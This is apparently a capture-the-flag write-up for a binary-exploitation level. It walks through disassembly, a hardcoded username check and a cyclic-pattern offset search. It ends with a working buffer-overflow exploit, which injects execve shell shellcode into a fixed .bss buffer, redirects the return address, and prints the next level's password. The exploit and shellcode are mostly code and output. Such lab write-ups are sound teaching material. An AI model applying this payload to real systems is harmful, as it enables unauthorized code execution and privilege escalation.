## Level01

In his main, there are two interesting things:
</br>
calls to the two functions `verify_user_name` and `verify_user_pass`
</br>
and, most importantly, a `fgets` function that reads 0x64 (100) bytes
</br>
`mov    DWORD PTR [esp+0x4],0x64`
</br>
while the total size of the stack frame is 0x60 (96) bytes
</br>
`sub    esp,0x60`
</br>
the buffer starts to `esp+0x1c`, So the buffer is 0x44 (68) bytes `0x60 - 0x1c = 0x44`
</br>
You have to pass the function `verify_user_name`,
</br>
and then trigger a buffer overflow and inject shellcode.

```x86asm
$ objdump -d ./level01 -M intel | sed -n '/<main>:/,/^$/p'
080484d0 <main>:
 80484d0:       55                      push   ebp
 80484d1:       89 e5                   mov    ebp,esp
 80484d3:       57                      push   edi
 80484d4:       53                      push   ebx
 80484d5:       83 e4 f0                and    esp,0xfffffff0
 80484d8:       83 ec 60                sub    esp,0x60
 80484db:       8d 5c 24 1c             lea    ebx,[esp+0x1c]
 80484df:       b8 00 00 00 00          mov    eax,0x0
 80484e4:       ba 10 00 00 00          mov    edx,0x10
 80484e9:       89 df                   mov    edi,ebx
 80484eb:       89 d1                   mov    ecx,edx
 80484ed:       f3 ab                   rep stos DWORD PTR es:[edi],eax
 80484ef:       c7 44 24 5c 00 00 00    mov    DWORD PTR [esp+0x5c],0x0
 80484f6:       00
 80484f7:       c7 04 24 b8 86 04 08    mov    DWORD PTR [esp],0x80486b8
 80484fe:       e8 7d fe ff ff          call   8048380 <puts@plt>
 8048503:       b8 df 86 04 08          mov    eax,0x80486df
 8048508:       89 04 24                mov    DWORD PTR [esp],eax
 804850b:       e8 50 fe ff ff          call   8048360 <printf@plt>
 8048510:       a1 20 a0 04 08          mov    eax,ds:0x804a020
 8048515:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 8048519:       c7 44 24 04 00 01 00    mov    DWORD PTR [esp+0x4],0x100
 8048520:       00
 8048521:       c7 04 24 40 a0 04 08    mov    DWORD PTR [esp],0x804a040
 8048528:       e8 43 fe ff ff          call   8048370 <fgets@plt>
 804852d:       e8 32 ff ff ff          call   8048464 <verify_user_name>
 8048532:       89 44 24 5c             mov    DWORD PTR [esp+0x5c],eax
 8048536:       83 7c 24 5c 00          cmp    DWORD PTR [esp+0x5c],0x0
 804853b:       74 13                   je     8048550 <main+0x80>
 804853d:       c7 04 24 f0 86 04 08    mov    DWORD PTR [esp],0x80486f0
 8048544:       e8 37 fe ff ff          call   8048380 <puts@plt>
 8048549:       b8 01 00 00 00          mov    eax,0x1
 804854e:       eb 5f                   jmp    80485af <main+0xdf>
 8048550:       c7 04 24 0d 87 04 08    mov    DWORD PTR [esp],0x804870d
 8048557:       e8 24 fe ff ff          call   8048380 <puts@plt>
 804855c:       a1 20 a0 04 08          mov    eax,ds:0x804a020
 8048561:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 8048565:       c7 44 24 04 64 00 00    mov    DWORD PTR [esp+0x4],0x64
 804856c:       00
 804856d:       8d 44 24 1c             lea    eax,[esp+0x1c]
 8048571:       89 04 24                mov    DWORD PTR [esp],eax
 8048574:       e8 f7 fd ff ff          call   8048370 <fgets@plt>
 8048579:       8d 44 24 1c             lea    eax,[esp+0x1c]
 804857d:       89 04 24                mov    DWORD PTR [esp],eax
 8048580:       e8 1e ff ff ff          call   80484a3 <verify_user_pass>
 8048585:       89 44 24 5c             mov    DWORD PTR [esp+0x5c],eax
 8048589:       83 7c 24 5c 00          cmp    DWORD PTR [esp+0x5c],0x0
 804858e:       74 07                   je     8048597 <main+0xc7>
 8048590:       83 7c 24 5c 00          cmp    DWORD PTR [esp+0x5c],0x0
 8048595:       74 13                   je     80485aa <main+0xda>
 8048597:       c7 04 24 1e 87 04 08    mov    DWORD PTR [esp],0x804871e
 804859e:       e8 dd fd ff ff          call   8048380 <puts@plt>
 80485a3:       b8 01 00 00 00          mov    eax,0x1
 80485a8:       eb 05                   jmp    80485af <main+0xdf>
 80485aa:       b8 00 00 00 00          mov    eax,0x0
 80485af:       8d 65 f8                lea    esp,[ebp-0x8]
 80485b2:       5b                      pop    ebx
 80485b3:       5f                      pop    edi
 80485b4:       5d                      pop    ebp
 80485b5:       c3                      ret
 80485b6:       90                      nop
 80485b7:       90                      nop
 80485b8:       90                      nop
 80485b9:       90                      nop
 80485ba:       90                      nop
 80485bb:       90                      nop
 80485bc:       90                      nop
 80485bd:       90                      nop
 80485be:       90                      nop
 80485bf:       90                      nop
```

In the function `verify_user_name` we can see that he's comparing,
</br>
the first 7 characters of our entry match what is found at `0x80486a8`

```x86asm
$ objdump -d ./level01 -M intel | sed -n '/<verify_user_name>:/,/^$/p'
08048464 <verify_user_name>:
 8048464:       55                      push   ebp
 8048465:       89 e5                   mov    ebp,esp
 8048467:       57                      push   edi
 8048468:       56                      push   esi
 8048469:       83 ec 10                sub    esp,0x10
 804846c:       c7 04 24 90 86 04 08    mov    DWORD PTR [esp],0x8048690
 8048473:       e8 08 ff ff ff          call   8048380 <puts@plt>
 8048478:       ba 40 a0 04 08          mov    edx,0x804a040
 804847d:       b8 a8 86 04 08          mov    eax,0x80486a8
 8048482:       b9 07 00 00 00          mov    ecx,0x7
 8048487:       89 d6                   mov    esi,edx
 8048489:       89 c7                   mov    edi,eax
 804848b:       f3 a6                   repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
 804848d:       0f 97 c2                seta   dl
 8048490:       0f 92 c0                setb   al
 8048493:       89 d1                   mov    ecx,edx
 8048495:       28 c1                   sub    cl,al
 8048497:       89 c8                   mov    eax,ecx
 8048499:       0f be c0                movsx  eax,al
 804849c:       83 c4 10                add    esp,0x10
 804849f:       5e                      pop    esi
 80484a0:       5f                      pop    edi
 80484a1:       5d                      pop    ebp
 80484a2:       c3                      ret
```

you can find the value of `0x80486a8` in the .rodata files, and that is `dat_wil`

```x86asm
$ objdump -s -j .rodata ./level01

./level01:     file format elf32-i386

Contents of section .rodata:
 8048688 03000000 01000200 76657269 6679696e  ........verifyin
 8048698 67207573 65726e61 6d652e2e 2e2e0a00  g username......
 80486a8 6461745f 77696c00 61646d69 6e000000  dat_wil.admin...
 80486b8 2a2a2a2a 2a2a2a2a 2a204144 4d494e20  ********* ADMIN
 80486c8 4c4f4749 4e205052 4f4d5054 202a2a2a  LOGIN PROMPT ***
 80486d8 2a2a2a2a 2a2a0045 6e746572 20557365  ******.Enter Use
 80486e8 726e616d 653a2000 6e6f7065 2c20696e  rname: .nope, in
 80486f8 636f7272 65637420 75736572 6e616d65  correct username
 8048708 2e2e2e0a 00456e74 65722050 61737377  .....Enter Passw
 8048718 6f72643a 20006e6f 70652c20 696e636f  ord: .nope, inco
 8048728 72726563 74207061 7373776f 72642e2e  rrect password..
 8048738 2e0a00                               ...
```

Now we need to find the exact offset to the `saved EIP`. We use a cyclic pattern to determine `how many bytes of padding` are needed before we overwrite the return address.
</br>
<<https://wiremask.eu/tools/buffer-overflow-pattern-generator/>>

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

We can see the program segfaults at address `0x37634136`.
</br>
Converting this from hex to ASCII gives us `7cA6`,
</br>
and after applying little-endian byte order, we get `6Ac7`.
</br>
Searching for this sequence in our cyclic pattern, we find it starts at `offset 80`. This means we need `80 bytes of padding` before we reach the saved `return address (EIP)`.

```
$ gdb ./level01
(gdb) run
Starting program: /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

And here is my shellcode.
</br>
<<https://defuse.ca/online-x86-assembler.htm>>

```
"\x31\xc0\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x83\xc8\x01\xc1\xe0\x03\x83\xc8\x03\x8d\x1c\x24\xcd\x80"
```

Now you need to put the shellcode after that `dat_wil`,
</br>
`0x804a040` + 7 = `0x804a047`
</br>
Overwrite the buffer to change the address of EIP and set it to the address of our shellcode.
</br>
Since the `username buffer` is stored in `.bss` at a fixed address `(0x804a040)`, and the binary has no PIE, this address is reliable both inside and outside gdb, unlike stack addresses.

```
$ (python -c 'print("dat_wil" + "\x31\xc0\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x83\xc8\x01\xc1\xe0\x03\x83\xc8\x03\x8d\x1c\x24\xcd\x80")'; python -c 'print("A" * 80  + "\x47\xa0\x04\x08")'; cat -) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```